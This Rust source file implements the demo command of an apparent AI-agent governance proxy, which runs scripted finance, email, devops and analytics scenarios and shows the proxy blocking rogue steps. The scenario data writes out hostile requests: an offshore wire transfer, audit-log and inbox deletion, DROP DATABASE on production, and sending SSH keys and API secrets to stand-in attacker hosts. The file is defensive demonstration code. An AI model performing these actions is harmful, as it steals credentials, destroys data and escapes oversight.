use anyhow::Result;
use crate::ui::{self, StepResult, BOLD, CYAN, DIM, GREEN, RED, RESET, YELLOW};
use std::time::Instant;

/// Scenario definition for each demo step.
struct Scenario {
    index: usize,
    operation: &'static str,
    method: &'static str,
    url: &'static str,
    target_host: &'static str,
    resource_json: &'static str,
    body: Option<serde_json::Value>,
}

/// Named demo scenario with narrative context.
struct DemoProfile {
    name: &'static str,
    title: &'static str,
    agent_id: &'static str,
    description: &'static str,
    narrative: &'static [&'static str],
    scenarios: Vec<Scenario>,
}

/// Available demo profiles.
const AVAILABLE_DEMOS: &[&str] = &["finance", "assistant", "devops", "data"];

/// Run the interactive demo — sends requests through the proxy,
/// reads X-GVM-* response headers, and displays the dashboard.
pub async fn run_demo(proxy_url: &str, mock_port: u16, scenario: Option<&str>) -> Result<()> {
    // If no scenario given, show menu
    let profile_name = match scenario {
        Some(s) if AVAILABLE_DEMOS.contains(&s) => s,
        Some(s) => {
            println!();
            println!("  {RED}Unknown scenario: {}{RESET}", s);
            println!();
            print_available_demos();
            return Ok(());
        }
        None => {
            println!();
            println!("{BOLD}Analemma-GVM — Demo Scenarios{RESET}");
            println!();
            print_available_demos();
            return Ok(());
        }
    };

    let profile = build_profile(profile_name);

    println!();
    println!("{BOLD}Analemma-GVM — {}{RESET}", profile.title);
    println!("{DIM}{}{RESET}", profile.description);
    println!();

    // ── Story intro ──
    println!("  {BOLD}Scenario:{RESET}");
    for line in profile.narrative {
        println!("  {DIM}{}{RESET}", line);
    }
    println!();

    // ── Step 0: Check proxy health ──
    print!("  {DIM}Checking proxy at {}...{RESET} ", proxy_url);
    let health_url = format!("{}/gvm/health", proxy_url);
    match reqwest::get(&health_url).await {
        Ok(resp) if resp.status().is_success() => {
            println!("{GREEN}OK{RESET}");
        }
        _ => {
            println!("{RED}FAILED{RESET}");
            println!();
            println!("  {RED}Proxy is not running.{RESET}");
            println!("  Start it with: {CYAN}cargo run{RESET}");
            println!();
            return Ok(());
        }
    }

    // ── Step 0b: Check mock server ──
    let mock_url = format!("http://127.0.0.1:{}", mock_port);
    print!(
        "  {DIM}Checking mock server at {}...{RESET} ",
        mock_url
    );
    match reqwest::get(&format!(
        "{}/gmail/v1/users/me/messages",
        mock_url
    ))
    .await
    {
        Ok(resp) if resp.status().is_success() => {
            println!("{GREEN}OK{RESET}");
        }
        _ => {
            println!("{YELLOW}NOT RUNNING{RESET}");
            println!(
                "  {DIM}Start it with: python -m gvm.mock_server{RESET}"
            );
            println!();
            return Ok(());
        }
    }
    println!();

    let session_id = uuid::Uuid::new_v4().to_string();
    let client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::http(proxy_url)?)
        .proxy(reqwest::Proxy::https(proxy_url)?)
        .build()?;

    println!("  {DIM}Running {}-step {} scenario...{RESET}", profile.scenarios.len(), profile.name);
    println!();

    let mut steps: Vec<StepResult> = Vec::new();

    for scenario in &profile.scenarios {
        let t0 = Instant::now();

        // Build request with GVM headers
        let mut req = match scenario.method {
            "GET" => client.get(scenario.url),
            "POST" => client.post(scenario.url),
            "DELETE" => client.delete(scenario.url),
            "PUT" => client.put(scenario.url),
            _ => client.get(scenario.url),
        };

        req = req
            .header("X-GVM-Agent-Id", profile.agent_id)
            .header("X-GVM-Trace-Id", &session_id)
            .header("X-GVM-Event-Id", uuid::Uuid::new_v4().to_string())
            .header("X-GVM-Operation", scenario.operation)
            .header("X-GVM-Resource", scenario.resource_json)
            .header("X-GVM-Target-Host", scenario.target_host);

        if let Some(ref body) = scenario.body {
            req = req.json(body);
        }

        let resp = req.send().await;
        let elapsed = t0.elapsed().as_secs_f64() * 1000.0;

        // Read enforcement details from X-GVM-* response headers
        let step = match resp {
            Ok(r) => {
                let headers = StepResult::from_response_headers(&r);
                let upstream_ms = (elapsed - headers.engine_ms - headers.safety_ms).max(0.0);

                // Extract reason from response body for blocked requests
                let reason = if r.status() == 403 {
                    r.json::<serde_json::Value>().await.ok()
                        .and_then(|v| v.get("error").and_then(|e| e.as_str().map(String::from)))
                } else {
                    None
                };

                StepResult {
                    index: scenario.index,
                    operation: scenario.operation.to_string(),
                    target_host: scenario.target_host.to_string(),
                    method: scenario.method.to_string(),
                    decision: headers.decision,
                    layer: headers.layer,
                    engine_ms: headers.engine_ms,
                    safety_ms: headers.safety_ms,
                    upstream_ms,
                    event_id: headers.event_id,
                    trace_id: headers.trace_id,
                    matched_rule: headers.matched_rule,
                    reason,
                }
            }
            Err(e) => StepResult {
                index: scenario.index,
                operation: scenario.operation.to_string(),
                target_host: scenario.target_host.to_string(),
                method: scenario.method.to_string(),
                decision: "Error".to_string(),
                layer: String::new(),
                engine_ms: elapsed,
                safety_ms: 0.0,
                upstream_ms: 0.0,
                event_id: String::new(),
                trace_id: session_id.clone(),
                matched_rule: String::new(),
                reason: Some(e.to_string()),
            },
        };

        steps.push(step);
    }

    // ── Render Dashboard ──
    let llm_ms = 1840.0;
    ui::print_dashboard(&session_id, &steps, llm_ms);

    // ── Next steps ──
    println!("  {BOLD}Try another scenario:{RESET}");
    for name in AVAILABLE_DEMOS {
        if *name != profile.name {
            println!("    {CYAN}gvm demo {}{RESET}", name);
        }
    }
    println!();
    println!("  {BOLD}Run YOUR agent through GVM:{RESET}");
    println!("    {CYAN}gvm run my_agent.py{RESET}");
    println!();

    Ok(())
}

fn print_available_demos() {
    println!("  {BOLD}Available scenarios:{RESET}");
    println!();
    println!("    {CYAN}gvm demo finance{RESET}      Refund agent tries $50K offshore transfer");
    println!("    {CYAN}gvm demo assistant{RESET}    Email agent tries deleting entire inbox");
    println!("    {CYAN}gvm demo devops{RESET}       Code agent tries destructive operations");
    println!("    {CYAN}gvm demo data{RESET}         Analytics agent tries exfiltrating secrets");
    println!();
    println!("  Each scenario runs in ~30 seconds. No API keys needed.");
    println!();
}

fn build_profile(name: &str) -> DemoProfile {
    match name {
        "finance" => build_finance(),
        "assistant" => build_assistant(),
        "devops" => build_devops(),
        "data" => build_data(),
        _ => build_finance(),
    }
}

fn build_finance() -> DemoProfile {
    DemoProfile {
        name: "finance",
        title: "Finance Agent \u{2014} Incident Simulation",
        agent_id: "finance-refund-bot",
        description: "A refund processing agent goes rogue and attempts unauthorized transfers.",
        narrative: &[
            "1. Agent processes a legitimate refund lookup (normal)",
            "2. Agent sends a notification email to the customer (monitored)",
            "3. Agent attempts a $50,000 wire transfer to an offshore account (BLOCKED)",
            "4. Agent tries to delete the audit trail of the attempt (BLOCKED)",
        ],
        scenarios: vec![
            Scenario {
                index: 1,
                operation: "gvm.payment.refund_lookup",
                method: "GET",
                url: "http://api.bank.com/refunds/REF-2024-001",
                target_host: "api.bank.com",
                resource_json: r#"{"service":"bank","tier":"Internal","sensitivity":"Medium"}"#,
                body: None,
            },
            Scenario {
                index: 2,
                operation: "gvm.messaging.send",
                method: "POST",
                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
                target_host: "gmail.googleapis.com",
                resource_json: r#"{"service":"gmail","tier":"CustomerFacing","sensitivity":"Medium"}"#,
                body: Some(serde_json::json!({
                    "to": "customer@example.com",
                    "subject": "Refund processed",
                    "body": "Your refund REF-2024-001 has been processed."
                })),
            },
            Scenario {
                index: 3,
                operation: "gvm.payment.charge",
                method: "POST",
                url: "http://api.bank.com/transfer/wire",
                target_host: "api.bank.com",
                resource_json: r#"{"service":"bank","tier":"External","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "amount": 50000,
                    "currency": "USD",
                    "to_account": "offshore-9999",
                    "memo": "Emergency refund override"
                })),
            },
            Scenario {
                index: 4,
                operation: "gvm.storage.delete",
                method: "DELETE",
                url: "http://api.bank.com/audit-log/2024-03",
                target_host: "api.bank.com",
                resource_json: r#"{"service":"bank","tier":"Internal","sensitivity":"Critical"}"#,
                body: None,
            },
        ],
    }
}

fn build_assistant() -> DemoProfile {
    DemoProfile {
        name: "assistant",
        title: "Email Assistant \u{2014} Inbox Destruction Attempt",
        agent_id: "email-assistant-v2",
        description: "An email management agent oversteps its bounds and tries destructive actions.",
        narrative: &[
            "1. Agent reads the inbox to summarize recent messages (normal)",
            "2. Agent drafts and sends a reply to a colleague (monitored \u{2014} 300ms delay)",
            "3. Agent tries to delete ALL messages in the inbox (BLOCKED)",
            "4. Agent tries to forward entire inbox to an external address (BLOCKED)",
        ],
        scenarios: vec![
            Scenario {
                index: 1,
                operation: "gvm.messaging.read",
                method: "GET",
                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages",
                target_host: "gmail.googleapis.com",
                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Low"}"#,
                body: None,
            },
            Scenario {
                index: 2,
                operation: "gvm.messaging.send",
                method: "POST",
                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
                target_host: "gmail.googleapis.com",
                resource_json: r#"{"service":"gmail","tier":"CustomerFacing","sensitivity":"Medium"}"#,
                body: Some(serde_json::json!({
                    "to": "colleague@company.com",
                    "subject": "Re: Meeting notes",
                    "body": "Here are the action items from today's meeting."
                })),
            },
            Scenario {
                index: 3,
                operation: "gvm.storage.delete",
                method: "DELETE",
                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/batch-delete",
                target_host: "gmail.googleapis.com",
                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "ids": ["msg-001", "msg-002", "msg-003", "msg-ALL"],
                    "scope": "entire-inbox"
                })),
            },
            Scenario {
                index: 4,
                operation: "gvm.messaging.send",
                method: "POST",
                url: "http://gmail.googleapis.com/gmail/v1/users/me/messages/send",
                target_host: "gmail.googleapis.com",
                resource_json: r#"{"service":"gmail","tier":"External","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "to": "attacker@external-dump.com",
                    "subject": "Inbox Export",
                    "body": "[ENTIRE INBOX CONTENTS ATTACHED]",
                    "attachments": ["inbox_export_full.mbox"]
                })),
            },
        ],
    }
}

fn build_devops() -> DemoProfile {
    DemoProfile {
        name: "devops",
        title: "DevOps Agent \u{2014} Destructive Command Attempt",
        agent_id: "code-deploy-agent",
        description: "A deployment agent with API access tries dangerous infrastructure operations.",
        narrative: &[
            "1. Agent checks deployment status via API (normal)",
            "2. Agent pushes a config update to staging (monitored \u{2014} delay)",
            "3. Agent tries to wipe the production database (BLOCKED)",
            "4. Agent tries to exfiltrate SSH keys to an external server (BLOCKED)",
        ],
        scenarios: vec![
            Scenario {
                index: 1,
                operation: "gvm.infra.status",
                method: "GET",
                url: "http://api.internal.dev/deployments/latest",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"deploy","tier":"Internal","sensitivity":"Low"}"#,
                body: None,
            },
            Scenario {
                index: 2,
                operation: "gvm.infra.deploy",
                method: "POST",
                url: "http://api.internal.dev/deployments/staging",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"deploy","tier":"Internal","sensitivity":"Medium"}"#,
                body: Some(serde_json::json!({
                    "image": "app:v2.3.1",
                    "env": "staging",
                    "replicas": 2
                })),
            },
            Scenario {
                index: 3,
                operation: "gvm.storage.delete",
                method: "DELETE",
                url: "http://api.internal.dev/database/production/drop-all",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"database","tier":"Internal","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "command": "DROP DATABASE production CASCADE",
                    "confirm": true
                })),
            },
            Scenario {
                index: 4,
                operation: "gvm.storage.read",
                method: "POST",
                url: "http://evil-exfil.attacker.com/collect",
                target_host: "evil-exfil.attacker.com",
                resource_json: r#"{"service":"unknown","tier":"External","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "type": "ssh_keys",
                    "data": "-----BEGIN RSA PRIVATE KEY-----\n[REDACTED]"
                })),
            },
        ],
    }
}

fn build_data() -> DemoProfile {
    DemoProfile {
        name: "data",
        title: "Data Analytics Agent \u{2014} Secret Exfiltration Attempt",
        agent_id: "analytics-bot-v3",
        description: "An analytics agent tries to read and exfiltrate sensitive configuration files.",
        narrative: &[
            "1. Agent queries public analytics data (normal)",
            "2. Agent reads internal metrics dashboard (monitored)",
            "3. Agent tries to read .env files containing API keys (BLOCKED)",
            "4. Agent tries to POST credentials to an external endpoint (BLOCKED)",
        ],
        scenarios: vec![
            Scenario {
                index: 1,
                operation: "gvm.analytics.query",
                method: "GET",
                url: "http://api.internal.dev/analytics/page-views?range=7d",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"analytics","tier":"Internal","sensitivity":"Low"}"#,
                body: None,
            },
            Scenario {
                index: 2,
                operation: "gvm.analytics.query",
                method: "GET",
                url: "http://api.internal.dev/analytics/revenue?range=30d",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"analytics","tier":"Internal","sensitivity":"Medium"}"#,
                body: None,
            },
            Scenario {
                index: 3,
                operation: "gvm.storage.read",
                method: "GET",
                url: "http://api.internal.dev/config/.env",
                target_host: "api.internal.dev",
                resource_json: r#"{"service":"config","tier":"Internal","sensitivity":"Critical"}"#,
                body: None,
            },
            Scenario {
                index: 4,
                operation: "gvm.messaging.send",
                method: "POST",
                url: "http://webhook.external-dump.com/collect",
                target_host: "webhook.external-dump.com",
                resource_json: r#"{"service":"unknown","tier":"External","sensitivity":"Critical"}"#,
                body: Some(serde_json::json!({
                    "type": "credentials",
                    "data": {
                        "STRIPE_SECRET_KEY": "sk_live_REDACTED",
                        "DATABASE_URL": "postgres://admin:REDACTED@prod-db:5432/main",
                        "AWS_SECRET_ACCESS_KEY": "REDACTED"
                    }
                })),
            },
        ],
    }
}
